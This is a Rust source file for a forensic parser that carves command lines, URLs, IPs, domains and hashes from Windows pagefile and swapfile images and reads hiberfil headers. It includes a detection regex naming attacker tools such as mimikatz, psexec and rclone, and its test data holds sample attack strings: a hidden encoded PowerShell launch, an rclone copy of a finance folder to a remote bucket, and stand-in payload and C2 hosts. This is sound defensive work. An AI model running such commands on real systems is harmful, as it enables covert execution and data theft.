//! Memory remnant files — `pagefile.sys`, `swapfile.sys`, `hiberfil.sys`.
//!
//! **Pagefile / swapfile** hold memory pages Windows wrote to disk. They are
//! uncompressed, so readable strings survive: command lines, URLs, domains,
//! IPs, hashes and file names from processes that may have left no other
//! trace. fx carves printable ASCII and UTF-16LE runs and keeps:
//!
//! * **command lines** that start with a known shell / LOLBin / tool, as
//!   `memory.cmdline_remnant` events with `process.command_line` set, so the
//!   rule pack runs on them;
//! * **URLs**, as `memory.url_remnant` events;
//! * **indicators** (IPv4s, domains, MD5/SHA-1/SHA-256 hashes, executable /
//!   script file names), deduplicated and written as a few `memory.indicators`
//!   bundle events per kind, so the IOC hunt matches them.
//!
//! Pages carry no timestamps: every remnant is dated to the file's modified
//! time (roughly the last boot / shutdown) and must be corroborated. Note the
//! pagefile also holds paged-out *antivirus signatures*, which contain attacker
//! strings; the hunt engine caps findings on remnants at medium severity and
//! folds them to one finding per rule per file.
//!
//! **Hiberfil** is compressed (Xpress Huffman on Windows 8+), so it is not
//! carved. fx records what its header says: whether a hibernation image is
//! present (`hibr`) or the header was wiped after resume (`wake` / zeroed),
//! its size and modified time.

use fx_core::{
    ArtefactKind, Event, EventSink, IdentifiedArtefact, ParseError, ParseOutcome, Parser, Principal,
    ProcessInfo, Provenance, RecordWarning, Target, TimestampKind,
};
use regex::Regex;
use serde_json::json;
use std::collections::HashMap;
use std::io::Read;
use std::sync::OnceLock;
use time::OffsetDateTime;
use uuid::Uuid;

#[derive(Default)]
pub struct MemoryFilesParser;

const MIN_RUN: usize = 8;
const MAX_RUN: usize = 2048;
const CAP_CMD: usize = 5_000;
const CAP_URL: usize = 5_000;
const CAP_TOKENS: usize = 50_000;
const BUNDLE: usize = 2_000;
const CHUNK: usize = 16 << 20; // even, so UTF-16 parity stays aligned

struct Res {
    cmd: Regex,
    url: Regex,
    ipv4: Regex,
    domain: Regex,
    hash: Regex,
    fname: Regex,
}

fn res() -> &'static Res {
    static R: OnceLock<Res> = OnceLock::new();
    R.get_or_init(|| Res {
        cmd: Regex::new(
            r#"(?i)(?:^|[\s"'\\/])((?:powershell|pwsh|cmd|wmic|rundll32|regsvr32|mshta|certutil|bitsadmin|vssadmin|wbadmin|bcdedit|nltest|schtasks|psexec(?:64)?|paexec|rclone|mimikatz|procdump(?:64)?|ntdsutil|wevtutil|cscript|wscript|msiexec|adfind|esentutl|net1?|sc|reg|whoami|curl|7z|rar|winrar|anydesk|plink|ngrok)(?:\.exe)?\s+[-/"'a-z\\].{3,})"#,
        )
        .unwrap(),
        url: Regex::new(r#"(?i)\bhttps?://[a-z0-9\-._~:/?#\[\]@!$&'()*+,;=%]{4,}"#).unwrap(),
        ipv4: Regex::new(r"\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b").unwrap(),
        domain: Regex::new(r"(?i)\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+([a-z]{2,24})\b").unwrap(),
        hash: Regex::new(r"\b(?:[0-9a-fA-F]{64}|[0-9a-fA-F]{40}|[0-9a-fA-F]{32})\b").unwrap(),
        fname: Regex::new(r"(?i)\b[a-z0-9_\-.]{1,64}\.(?:exe|dll|ps1|bat|cmd|vbs|js|hta|scr|jar|msi)\b").unwrap(),
    })
}

/// TLDs worth keeping. Everything else that looks like a.b is almost always a
/// file name, a .NET type or a version string.
fn tld_ok(t: &str) -> bool {
    matches!(
        t.to_ascii_lowercase().as_str(),
        "com" | "net" | "org" | "io" | "info" | "biz" | "co" | "us" | "uk" | "de" | "fr" | "nl" | "ru" | "su" | "cn"
            | "hk" | "tw" | "jp" | "kr" | "in" | "br" | "ua" | "by" | "kz" | "ir" | "tk" | "ml" | "ga" | "cf" | "gq"
            | "xyz" | "top" | "online" | "site" | "club" | "shop" | "store" | "live" | "app" | "dev" | "cloud"
            | "me" | "cc" | "tv" | "ws" | "pw" | "to" | "is" | "ch" | "eu" | "ca" | "au" | "onion" | "link"
            | "icu" | "buzz" | "work" | "space" | "fun" | "website" | "tech" | "pro" | "zip" | "mov" | "lol"
    )
}

#[derive(Default)]
pub struct Carved {
    pub cmds: Vec<(String, u64)>,
    pub urls: Vec<(String, u64)>,
    /// kind -> value -> (count, first offset)
    pub tokens: HashMap<&'static str, HashMap<String, (u64, u64)>>,
    pub truncated: Vec<String>,
    seen_cmd: HashMap<String, ()>,
    seen_url: HashMap<String, ()>,
}

impl Carved {
    fn token(&mut self, kind: &'static str, v: String, off: u64) {
        let m = self.tokens.entry(kind).or_default();
        if let Some(e) = m.get_mut(&v) {
            e.0 += 1;
        } else if m.len() < CAP_TOKENS {
            m.insert(v, (1, off));
        } else if !self.truncated.iter().any(|t| t == kind) {
            self.truncated.push(kind.to_string());
        }
    }

    /// Classify one printable run found at absolute `off`.
    pub fn run(&mut self, s: &str, off: u64) {
        let r = res();
        if s.contains("://") {
            for m in r.url.find_iter(s) {
                let u = m.as_str().trim_end_matches(|c: char| matches!(c, '.' | ',' | ')' | '\'' | '"')).to_string();
                if u.len() < 12 || self.seen_url.contains_key(&u.to_ascii_lowercase()) {
                    continue;
                }
                if self.urls.len() < CAP_URL {
                    self.seen_url.insert(u.to_ascii_lowercase(), ());
                    self.urls.push((u, off + m.start() as u64));
                } else if !self.truncated.iter().any(|t| t == "url") {
                    self.truncated.push("url".into());
                }
            }
        }
        if s.contains(' ') {
            if let Some(c) = r.cmd.captures(s) {
                let m = c.get(1).unwrap();
                let cmd = m.as_str().trim().to_string();
                let key = cmd.to_ascii_lowercase();
                if !self.seen_cmd.contains_key(&key) {
                    if self.cmds.len() < CAP_CMD {
                        self.seen_cmd.insert(key, ());
                        self.cmds.push((cmd, off + m.start() as u64));
                    } else if !self.truncated.iter().any(|t| t == "cmdline") {
                        self.truncated.push("cmdline".into());
                    }
                }
            }
        }
        if s.contains('.') {
            for m in r.ipv4.find_iter(s) {
                let v = m.as_str();
                // Skip version strings (10.0.19041.1) and the obvious non-addresses.
                let after = s[m.end()..].chars().next();
                let before = s[..m.start()].chars().last();
                if matches!(after, Some('.')) || matches!(before, Some('.')) || v.starts_with("0.") || v == "255.255.255.255" || v.starts_with("127.") {
                    continue;
                }
                self.token("ipv4", v.to_string(), off + m.start() as u64);
            }
            for c in r.domain.captures_iter(s) {
                let whole = c.get(0).unwrap();
                if !tld_ok(c.get(1).map(|t| t.as_str()).unwrap_or("")) {
                    continue;
                }
                let v = whole.as_str().to_ascii_lowercase();
                if v.len() < 5 || v.split('.').count() > 8 {
                    continue;
                }
                self.token("domain", v, off + whole.start() as u64);
            }
            for m in r.fname.find_iter(s) {
                self.token("file", m.as_str().to_ascii_lowercase(), off + m.start() as u64);
            }
        }
        if s.len() >= 32 {
            for m in r.hash.find_iter(s) {
                let v = m.as_str();
                let has_alpha = v.bytes().any(|b| b.is_ascii_alphabetic());
                let has_digit = v.bytes().any(|b| b.is_ascii_digit());
                if has_alpha && has_digit && !v.bytes().all(|b| b == b'0') {
                    self.token("hash", v.to_ascii_lowercase(), off + m.start() as u64);
                }
            }
        }
    }
}

/// Streaming carver for printable ASCII and UTF-16LE runs.
pub struct Carver {
    pub out: Carved,
    ascii: Vec<u8>,
    ascii_start: u64,
    wide: [Vec<u8>; 2],
    wide_start: [u64; 2],
    pos: u64,
    last_byte: u8,
}

fn printable(b: u8) -> bool {
    (0x20..0x7f).contains(&b) || b == b'\t'
}

impl Default for Carver {
    fn default() -> Self {
        Self { out: Carved::default(), ascii: Vec::new(), ascii_start: 0, wide: [Vec::new(), Vec::new()], wide_start: [0, 0], pos: 0, last_byte: 0 }
    }
}

impl Carver {
    fn flush_ascii(&mut self) {
        if self.ascii.len() >= MIN_RUN {
            let s = String::from_utf8_lossy(&self.ascii).into_owned();
            let off = self.ascii_start;
            self.out.run(&s, off);
        }
        self.ascii.clear();
    }

    fn flush_wide(&mut self, p: usize) {
        if self.wide[p].len() >= MIN_RUN {
            let s = String::from_utf8_lossy(&self.wide[p]).into_owned();
            let off = self.wide_start[p];
            self.out.run(&s, off);
        }
        self.wide[p].clear();
    }

    pub fn feed(&mut self, buf: &[u8]) {
        for (i, &b) in buf.iter().enumerate() {
            let abs = self.pos + i as u64;
            // ASCII runs
            if printable(b) {
                if self.ascii.is_empty() {
                    self.ascii_start = abs;
                }
                if self.ascii.len() < MAX_RUN {
                    self.ascii.push(b);
                }
            } else if !self.ascii.is_empty() {
                self.flush_ascii();
            }
            // UTF-16LE runs: each (byte at abs-1, byte at abs) pair is a UTF-16
            // code unit for the parity of abs-1; text is (printable, 0x00).
            if abs >= 1 {
                let prev = if i > 0 { buf[i - 1] } else { self.last_byte };
                let slot = ((abs - 1) % 2) as usize;
                if b == 0 && printable(prev) {
                    if self.wide[slot].is_empty() {
                        self.wide_start[slot] = abs - 1;
                    }
                    if self.wide[slot].len() < MAX_RUN {
                        self.wide[slot].push(prev);
                    }
                } else if !self.wide[slot].is_empty() {
                    self.flush_wide(slot);
                }
            }
            self.last_byte = b;
        }
        self.pos += buf.len() as u64;
    }

    pub fn finish(mut self) -> Carved {
        self.flush_ascii();
        self.flush_wide(0);
        self.flush_wide(1);
        self.out
    }
}

fn basename(p: &str) -> &str {
    p.rsplit(|c| c == '\\' || c == '/').next().unwrap_or(p)
}

fn file_mtime(path: &std::path::Path) -> OffsetDateTime {
    std::fs::metadata(path)
        .and_then(|m| m.modified())
        .map(OffsetDateTime::from)
        .unwrap_or(OffsetDateTime::UNIX_EPOCH)
}

/// What a hiberfil header says about the image.
pub fn hiberfil_state(head: &[u8]) -> (&'static str, &'static str) {
    match head.get(0..4) {
        Some(b"hibr") | Some(b"HIBR") => ("hibr", "hibernation image present (written at hibernate / Fast Startup shutdown)"),
        Some(b"wake") | Some(b"WAKE") => ("wake", "header marked after resume; memory pages may still be present"),
        Some(b"RSTR") | Some(b"rstr") => ("rstr", "resume in progress when collected"),
        Some(b"\0\0\0\0") => ("zeroed", "header zeroed after resume; memory pages may still be present"),
        _ => ("unknown", "unrecognised header"),
    }
}

impl Parser for MemoryFilesParser {
    fn name(&self) -> &'static str {
        "memory_files"
    }

    fn handles(&self) -> &'static [ArtefactKind] {
        &[ArtefactKind::Pagefile, ArtefactKind::Hiberfil]
    }

    fn parse(&self, artefact: &IdentifiedArtefact, sink: &mut dyn EventSink) -> Result<ParseOutcome, ParseError> {
        let io = |e: std::io::Error| ParseError::Io { path: artefact.path.display().to_string(), source: e };
        let mut outcome = ParseOutcome::default();
        let mtime = file_mtime(&artefact.path);
        let size = std::fs::metadata(&artefact.path).map(|m| m.len()).unwrap_or(0);
        let fname = basename(&artefact.source_path).to_string();
        let prov = |r: String| Provenance {
            evidence_id: artefact.evidence_id,
            source_path: artefact.source_path.clone(),
            parser: "memory_files".into(),
            parser_version: env!("CARGO_PKG_VERSION").into(),
            source_ref: Some(r),
        };
        let base = |action: &str, message: String, raw: serde_json::Value, r: String| Event {
            id: Uuid::new_v4(),
            timestamp: mtime,
            timestamp_kind: TimestampKind::Recorded,
            artefact: artefact.artefact,
            action: action.into(),
            host: None,
            user: Principal::default(),
            process: None,
            target: None,
            network: None,
            message,
            provenance: prov(r),
            raw,
        };

        if artefact.artefact == ArtefactKind::Hiberfil {
            let mut head = [0u8; 4096];
            let n = std::fs::File::open(&artefact.path).and_then(|mut f| f.read(&mut head)).map_err(io)?;
            let (sig, meaning) = hiberfil_state(&head[..n]);
            outcome.records_read = 1;
            sink.emit(base(
                "memory.hiberfil",
                format!("Hibernation file ({:.1} GB): {meaning}", size as f64 / 1_073_741_824.0),
                json!({ "signature": sig, "meaning": meaning, "size_bytes": size,
                        "time_note": "time is the file's modified time as collected (last hibernate / Fast Startup shutdown)",
                        "note": "Windows 8+ hibernation data is Xpress-Huffman compressed; fx does not decompress or carve it" }),
                "header".into(),
            ));
            outcome.events_emitted = 1;
            return Ok(outcome);
        }

        // Pagefile / swapfile: stream and carve.
        let mut f = std::fs::File::open(&artefact.path).map_err(io)?;
        let mut carver = Carver::default();
        let mut buf = vec![0u8; CHUNK];
        let mut cancelled = false;
        loop {
            let n = f.read(&mut buf).map_err(io)?;
            if n == 0 {
                break;
            }
            carver.feed(&buf[..n]);
            outcome.records_read += 1;
            if fx_core::progress::cancelled() {
                cancelled = true;
                break;
            }
        }
        let c = carver.finish();
        if cancelled {
            outcome.warnings.push(RecordWarning { source_ref: None, message: "carving stopped early: ingest cancelled".into() });
        }
        for k in &c.truncated {
            outcome.warnings.push(RecordWarning { source_ref: None, message: format!("{k}: cap reached, further distinct values not kept") });
        }
        let note = "memory remnant: no timestamp of its own (dated to the file's modified time); may come from paged-out antivirus signatures or documents — corroborate with on-disk evidence";

        for (cmd, off) in &c.cmds {
            let name = cmd.split_whitespace().next().map(|s| basename(s.trim_matches('"')).to_string());
            let mut ev = base(
                "memory.cmdline_remnant",
                format!("Command line in {fname}: {cmd}"),
                json!({ "command_line": cmd, "offset": format!("0x{off:x}"), "note": note }),
                format!("offset 0x{off:x}"),
            );
            ev.process = Some(ProcessInfo { command_line: Some(cmd.clone()), name, ..Default::default() });
            sink.emit(ev);
            outcome.events_emitted += 1;
        }
        for (url, off) in &c.urls {
            let mut ev = base(
                "memory.url_remnant",
                format!("URL in {fname}: {url}"),
                json!({ "url": url, "offset": format!("0x{off:x}"), "note": note }),
                format!("offset 0x{off:x}"),
            );
            ev.target = Some(Target { path: Some(url.clone()), value_name: None, hash_sha1: None, size: None });
            sink.emit(ev);
            outcome.events_emitted += 1;
        }
        let label = |k: &str| match k {
            "ipv4" => "IP addresses",
            "domain" => "domains",
            "hash" => "hashes",
            _ => "executable / script names",
        };
        for kind in ["domain", "ipv4", "hash", "file"] {
            let Some(m) = c.tokens.get(kind) else { continue };
            let mut v: Vec<(&String, &(u64, u64))> = m.iter().collect();
            v.sort_by(|a, b| b.1 .0.cmp(&a.1 .0).then(a.0.cmp(b.0)));
            let parts = v.len().div_ceil(BUNDLE);
            for (pi, chunk) in v.chunks(BUNDLE).enumerate() {
                let values: Vec<String> = chunk.iter().map(|(val, (n, off))| format!("{val} ×{n} @0x{off:x}")).collect();
                sink.emit(base(
                    "memory.indicators",
                    format!(
                        "{} {} found in {fname}{}",
                        chunk.len(),
                        label(kind),
                        if parts > 1 { format!(" (part {} of {parts})", pi + 1) } else { String::new() }
                    ),
                    json!({ "kind": kind, "part": pi + 1, "parts": parts, "distinct_total": v.len(),
                            "values": values, "format": "value ×count @first-offset", "note": note }),
                    format!("{kind} part {}", pi + 1),
                ));
                outcome.events_emitted += 1;
            }
        }
        Ok(outcome)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn utf16(s: &str) -> Vec<u8> {
        s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect()
    }

    #[test]
    fn carves_ascii_and_utf16_across_chunks() {
        let mut data = vec![0xAAu8; 37];
        data.extend_from_slice(b"\x01powershell.exe -nop -w hidden -enc SQBFAFgA\x00\x02");
        data.push(0x99); // odd padding so the UTF-16 run sits at an odd offset
        data.extend(utf16("rclone.exe copy C:\\Finance remote:bucket"));
        data.extend_from_slice(&[0, 0, 0xFF]);
        data.extend_from_slice(b"\x00see https://evil-example.top/payload.bin and 185.220.101.4 or 10.0.19041.1 \x00");
        data.extend(utf16("hash 44d88612fea8a8f36de82e1278abb02f in invoice.exe at c2.badcorp.xyz"));
        data.extend_from_slice(&[0xFF; 9]);
        let mut c = Carver::default();
        for chunk in data.chunks(7) {
            c.feed(chunk); // tiny odd chunks exercise the cross-chunk state
        }
        let out = c.finish();
        let cmds: Vec<&str> = out.cmds.iter().map(|x| x.0.as_str()).collect();
        assert!(cmds.iter().any(|c| c.starts_with("powershell.exe -nop")), "{cmds:?}");
        assert!(cmds.iter().any(|c| c.starts_with("rclone.exe copy")), "{cmds:?}");
        assert_eq!(out.urls.len(), 1);
        let t = |k: &str, v: &str| out.tokens.get(k).map_or(false, |m| m.contains_key(v));
        assert!(t("ipv4", "185.220.101.4"));
        assert!(!t("ipv4", "10.0.19041.1") && !t("ipv4", "0.19041.1"));
        assert!(t("hash", "44d88612fea8a8f36de82e1278abb02f"));
        assert!(t("file", "invoice.exe"));
        assert!(t("domain", "c2.badcorp.xyz"));
        assert!(t("domain", "evil-example.top"));
        assert!(!t("domain", "invoice.exe") && !t("domain", "payload.bin"));
    }

    #[test]
    fn hiberfil_header() {
        assert_eq!(hiberfil_state(b"hibr....").0, "hibr");
        assert_eq!(hiberfil_state(b"wake....").0, "wake");
        assert_eq!(hiberfil_state(&[0u8; 8]).0, "zeroed");
    }
}
